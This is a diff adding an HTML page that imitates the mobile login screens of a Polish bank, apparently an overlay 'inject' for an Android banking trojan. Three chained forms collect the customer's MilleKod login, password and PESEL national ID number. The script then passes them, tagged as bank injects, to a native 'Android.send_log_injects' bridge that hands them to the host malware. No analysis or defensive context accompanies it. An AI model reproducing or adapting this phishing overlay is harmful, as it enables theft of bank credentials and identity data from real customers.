@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <style>
+        body { 
+            background-color: #f5f5f5;
+        }
+
+        #form1, #form2 , #form3 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section {
+            margin-top: 50px;
+            flex: 1;
+            padding: 15px;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        label {
+            font-size: 22px;
+            font-weight: 100;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .input {
+            padding: 8px;
+            border: 1px solid #c2c2c2;
+            border-radius: 3px;
+            width: 100%;
+            margin-top: 12px;
+            margin-bottom: 20px;
+        }
+
+        .button {
+            width: 60%;
+            padding: 10px;
+            color: #fff;
+            border: 0;
+            border-radius: 3px;
+            display: block;
+            margin: 0 auto;
+            background-color: #bd004f;
+            font-weight: 600;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: auto auto auto auto auto auto auto auto auto auto auto;
+            grid-gap: 5px;
+            padding: 0 30px;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+
+    </style>
+</head>
+<body>
+    <form id="form" onsubmit="return false">
+        <div id="form1">
+            <section>
+                <label for="login">Podaj <span style="font-weight: 600;">MilleKod</span></label>
+                <img style="float: right;width: 18px;margin-top: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAlCAAAAAALwsTcAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QkZCRUU2MEM5NDk3MTFFQUFGQUY4MjY0Qzc5RTQwRjAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QkZCRUU2MEQ5NDk3MTFFQUFGQUY4MjY0Qzc5RTQwRjAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpCRkJFRTYwQTk0OTcxMUVBQUZBRjgyNjRDNzlFNDBGMCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCRkJFRTYwQjk0OTcxMUVBQUZBRjgyNjRDNzlFNDBGMCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsIpfe8AAAJ3SURBVDjLfZRZV+owFIXz/3/NTjpJgTIJKFJgIeCl9yoCMohMLWOlTe6DYIOi56lZ+XrWzk7OJkKuw6Lba1crjed/rz6XN0j0yV2nkLxKKYwpqhFP1yfBJWzdSukUUanx0vQbFrzkVAqAmde3paKlAACLN/fnmO+YFGCZxutgut3Ohp1+SQWg365kbNcyAJYb7IOT8PDg2irA8ssI8x0dMFqbs8OJ93EcoIXVCQt7BhDvhOJLcTcLMHt/xGZJwOxw8b28LKC3P7DdPaC3pV788w8+jwPZmRBE8IkBWt5FlNtbfnJBT4NSPwgi9nUgNZKUZxPJ/edqUwayU0HEMg9WPUTYrqwXot58qEH/y0n4QpHoy7onrZEk1LsBbJ/4DpCfyth2Lhv47gB3M7JtgdpL2a2aWZI0iK6CzICsbGgtuVlgQfel9WMCuSfiZXDVOHuaFlQZe8nCcoinI9b5DVtcQ28TL43Yn9+waQ6GQ1Y3H7f2I9a1kH4kmzqUmvsL1tZR7JN9DSguf8aCJ4rsGwmeKayxbEjqzJC1DZQ2hM8y0BrSrPF24i6yl09MmA8hEdsykJvLb3HoRpe1azCkRoKIoK9Ba/jiYoWjGFhlL4gQ6xKQ6PGL2KoAJAdCECHCoQmaHV/iNhUF2r3/MTJ+WwPLXeA2VRW04B4ni69rFCz1/EUfXxRV0PSEn8aZuzYFvarMJV/Erp1ggDUMo3DgXk0DFNMeePN1INaL8ayZ1ACaPqbXMWr41okBYLp5XW006zcJQwWglrzwS74F05IGAJQpCqMAwJL9d/4tBvnhrWJQ/ZSCzO5JuUrOzuaPmw9ly8o3mt3tWfL8B+/HAKIVlHBMAAAAAElFTkSuQmCC" alt="">
+                
+                <input type="tel" id="login" name="login" class="input" maxlength="8" autocomplete="off" required>
+
+                <p style="color: #303030;font-size: 14px;font-weight: 600;">Wprowadź swój 8-cyfrowy MilleKod lub własną nazwę dla MilleKodu ustaloną w Millenecie.</p>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPage" value="ZALOGUJ">
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header style="padding: 20px;">
+                <p style="text-align: center;font-size: 24px;color: #1b1b1b;font-weight: 100;margin-top: 50px;">Enter P@ssword 1</p>
+                <span style="color: #1b1b1b;font-size: 12px;display: block;">Enter an 8-digit P@ssword 1</span>
+            </header>
+            <section style="margin-top: 0;padding: 20px;">
+                <label for="password" style="font-weight: 600;font-size: 18px;">P@ssword 1</label>
+                <img style="float: right;margin-top: 4px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAXCAMAAAAm/38fAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjZCQjVCNzY5NUQ3MTFFQThCOUJDODk0OTdEM0M2MTQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjZCQjVCNzc5NUQ3MTFFQThCOUJDODk0OTdEM0M2MTQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2NkJCNUI3NDk1RDcxMUVBOEI5QkM4OTQ5N0QzQzYxNCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2NkJCNUI3NTk1RDcxMUVBOEI5QkM4OTQ5N0QzQzYxNCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PkKcwSUAAAJ2UExURb0AT70BUL4BUL4DUb4EUb4EUr4GU78HU78HVL8IVL8JVL8JVb8KVb8KVr8LVsAKVsALVsAMV8ANWMAOWMAQWcEQWsETXMEUXMIUXcIVXcIWXsIXXsIXX8IYX8IZX8MXX8MYX8MZYMMaYcMbYcMcYcMcYsMdYsQcYcQeY8QfZMQgZMQhZcQjZ8UiZsUkZ8UmacYmacYnaccsbMctbccubsgtbcgubsgvb8gwb8gyccg1cskxcMk2c8o4dco5dso6dss+ecxBe8xDfM1Ffc1Gfs1If81JgM5Kgc5Lgc5Mgs9Ng89Qhc9Rhc9Sh9BShtFai9FajNJcjdJejtNejtNgkNRhkdRllNVnlNZvmtd1nth0ndh3n9l7otl7o9l8otp+pNqBptuAptuFqdyGqtyHqtyIqtyIq9yKrNyKrdyLrN2LrN2Lrd2Mrd6Sst6Ts9+VtN+WtN+XteCZt+Cat+CbuOGdueGeuuGhvOKhvOKiveKjveOnwOOpweSpweSqwuSsw+StxOWvxeWwxuWyx+ayx+azyOa0yea1yua3yue3y+e4zOe5zOe6zee7zei5zOi6zei8zui9zui9z+i+z+i/0Om/0OnA0enC0unD0+rD0+rF1OrF1erG1OrG1erH1evI1+vJ1+vL2OvM2ezO2uzP2+3R3e7Y4e7Z4u/Y4e/Z4u/a4u/c4/Dg5/Dh5/Dj6PHj6PHj6fHk6PHk6fHl6fHl6vHm6/Hn6/Ln6/Ln7PLo7PLp7PLp7fLq7fLs7vPr7vPs7/Pt7/Pt8PPu8PPv8fPw8fTu8PTv8fTw8fTw8vTx8vTy8/Tz8/Tz9PT09PXz9PX09PX09fX19Ur4ya4AAAGySURBVCjPY7gIBkdX1ofq83DpBNWtOHABLMIAJhfHWAto2To52WnzmkUvPA+TON9rw29YMGvZmrWr5hSbclu2noZInOpQFfZffREK1oSIyjWdAkvMtBRL2noRDnZmS5tMAkns8uPL2AcUOLMkP2/pWSDjQK6w6/aLDOfKhdx3ALmbwljYmDmT9wOZu735Ck8x7PSUbAM5Y324R5Qfk8ZckGP6FJw3MCxQcdgOMvrC9q3H5vGwtIDYB5xlpzNUCsadgFmbzqg3H8Q4ncJXypDBWnwaIr4nRlY+9xCIdb6aNYUhnqEOqqFJXKb/JITZyRDDkMZSeh7Cm2QUDFVyvpY5iaGMLwGqbFvXIqjE6RzuIoYZMs57oPwNx6CM414SExm2OypOAwf0sUROl4Ng8Quz1ezXMJzK5wsAazkUwWwF0bs/hC/zJMPFLY58lWDr9zYvh1hdI2KzHhS67QZKJfsQobu/XFO3ERzsxyqklCPXwsQ3xWqIlRyDxOCZBlUWi+51Bw4fObBxsg2zYtUpWJyfnRKiy2vsExLia86rFdhzFpEYzm+emuWpxsGu7pY6YQMkIAAX+0fKZ+peHwAAAABJRU5ErkJggg==" alt="">
+
+                <input type="passwor" class="input" inputmode="numeric" id="password" name="password" placeholder="" autocomplete="off">
+
+                <span style="font-size: 12px;">If you dont't remembere P@ssword <b> 1 visit closest Bank branch </b> or <b> call: +48 22 598 40 50 or 801 331 331 </b></span>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="lastPage" value="Confirm">
+            </footer>
+        </div>
+        <div id="form3" style="display: none;">
+            <header style="padding: 20px;">
+                <p style="text-align: center;font-size: 24px;color: #1b1b1b;font-weight: 100;margin-top: 50px;">Enter Pesel</p>
+                <span style="color: #1b1b1b;font-size: 12px;display: block;">Enter an 8-digit Pesel</span>
+            </header>
+            <section style="margin-top: 0;padding: 20px;">
+                <label for="password" style="font-weight: 600;font-size: 18px;">Pesel</label>
+                <img style="float: right;margin-top: 4px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAXCAMAAAAm/38fAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjZCQjVCNzY5NUQ3MTFFQThCOUJDODk0OTdEM0M2MTQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjZCQjVCNzc5NUQ3MTFFQThCOUJDODk0OTdEM0M2MTQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2NkJCNUI3NDk1RDcxMUVBOEI5QkM4OTQ5N0QzQzYxNCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2NkJCNUI3NTk1RDcxMUVBOEI5QkM4OTQ5N0QzQzYxNCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PkKcwSUAAAJ2UExURb0AT70BUL4BUL4DUb4EUb4EUr4GU78HU78HVL8IVL8JVL8JVb8KVb8KVr8LVsAKVsALVsAMV8ANWMAOWMAQWcEQWsETXMEUXMIUXcIVXcIWXsIXXsIXX8IYX8IZX8MXX8MYX8MZYMMaYcMbYcMcYcMcYsMdYsQcYcQeY8QfZMQgZMQhZcQjZ8UiZsUkZ8UmacYmacYnaccsbMctbccubsgtbcgubsgvb8gwb8gyccg1cskxcMk2c8o4dco5dso6dss+ecxBe8xDfM1Ffc1Gfs1If81JgM5Kgc5Lgc5Mgs9Ng89Qhc9Rhc9Sh9BShtFai9FajNJcjdJejtNejtNgkNRhkdRllNVnlNZvmtd1nth0ndh3n9l7otl7o9l8otp+pNqBptuAptuFqdyGqtyHqtyIqtyIq9yKrNyKrdyLrN2LrN2Lrd2Mrd6Sst6Ts9+VtN+WtN+XteCZt+Cat+CbuOGdueGeuuGhvOKhvOKiveKjveOnwOOpweSpweSqwuSsw+StxOWvxeWwxuWyx+ayx+azyOa0yea1yua3yue3y+e4zOe5zOe6zee7zei5zOi6zei8zui9zui9z+i+z+i/0Om/0OnA0enC0unD0+rD0+rF1OrF1erG1OrG1erH1evI1+vJ1+vL2OvM2ezO2uzP2+3R3e7Y4e7Z4u/Y4e/Z4u/a4u/c4/Dg5/Dh5/Dj6PHj6PHj6fHk6PHk6fHl6fHl6vHm6/Hn6/Ln6/Ln7PLo7PLp7PLp7fLq7fLs7vPr7vPs7/Pt7/Pt8PPu8PPv8fPw8fTu8PTv8fTw8fTw8vTx8vTy8/Tz8/Tz9PT09PXz9PX09PX09fX19Ur4ya4AAAGySURBVCjPY7gIBkdX1ofq83DpBNWtOHABLMIAJhfHWAto2To52WnzmkUvPA+TON9rw29YMGvZmrWr5hSbclu2noZInOpQFfZffREK1oSIyjWdAkvMtBRL2noRDnZmS5tMAkns8uPL2AcUOLMkP2/pWSDjQK6w6/aLDOfKhdx3ALmbwljYmDmT9wOZu735Ck8x7PSUbAM5Y324R5Qfk8ZckGP6FJw3MCxQcdgOMvrC9q3H5vGwtIDYB5xlpzNUCsadgFmbzqg3H8Q4ncJXypDBWnwaIr4nRlY+9xCIdb6aNYUhnqEOqqFJXKb/JITZyRDDkMZSeh7Cm2QUDFVyvpY5iaGMLwGqbFvXIqjE6RzuIoYZMs57oPwNx6CM414SExm2OypOAwf0sUROl4Ng8Quz1ezXMJzK5wsAazkUwWwF0bs/hC/zJMPFLY58lWDr9zYvh1hdI2KzHhS67QZKJfsQobu/XFO3ERzsxyqklCPXwsQ3xWqIlRyDxOCZBlUWi+51Bw4fObBxsg2zYtUpWJyfnRKiy2vsExLia86rFdhzFpEYzm+emuWpxsGu7pY6YQMkIAAX+0fKZ+peHwAAAABJRU5ErkJggg==" alt="">
+
+                <input type="password" class="input" inputmode="numeric" id="pesel" name="pesel" placeholder="" autocomplete="off">
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" value="Confirm">
+            </footer>
+        </div>
+    </form>
+    <script>
+
+        $('#login').mask('00000000');
+        $('#password').mask('00000000');
+        $('#pesel').mask('00000000000');
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password'),
+            pesel = document.getElementById('pesel'),
+            nextPage = document.getElementById('nextPage'),
+            lastPage = document.getElementById('lastPage'),
+            sendData = document.getElementById('sendData'),
+            form = document.getElementById('form'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            form3 = document.getElementById('form3');
+
+        nextPage.onclick = function() {
+            if(login.value.length != 8) {
+                login.classList.add('error');
+                login.focus();
+            } else {
+                login.classList.remove('error');
+                form1.style.display = 'none';
+                form2.style.display = 'flex';
+                form3.style.display = 'none';
+            }
+        }
+
+        lastPage.onclick = function() {
+            if(password.value.length != 8) {
+                password.classList.add('error');
+            } else {
+                password.classList.remove('error')
+
+                form2.style.display = 'none';
+                form3.style.display = 'flex';
+            }
+        }
+
+        sendData.onclick = function() {
+            if(pesel.value.length < 6) {
+                pesel.classList.add('error');
+            } else {
+                pesel.classList.remove('error')
+                
+                var data = {};
+                    data.login = login.value;
+                    data.password = password.value;
+                    data.pesel = pesel.value;
+                    data.type_injects = "banks";
+                    data.closed = "close_activity_injects";
+                    
+                    var ua = navigator.userAgent.toLowerCase();
+                    if(ua.indexOf("android") > -1) {
+                        try {
+                            Android.send_log_injects(JSON.stringify(data))
+                        } catch (err) {}
+                    }else{
+                        alert(JSON.stringify(data));
+                    }
+            }
+        }
+    </script>
+</body>
+</html>
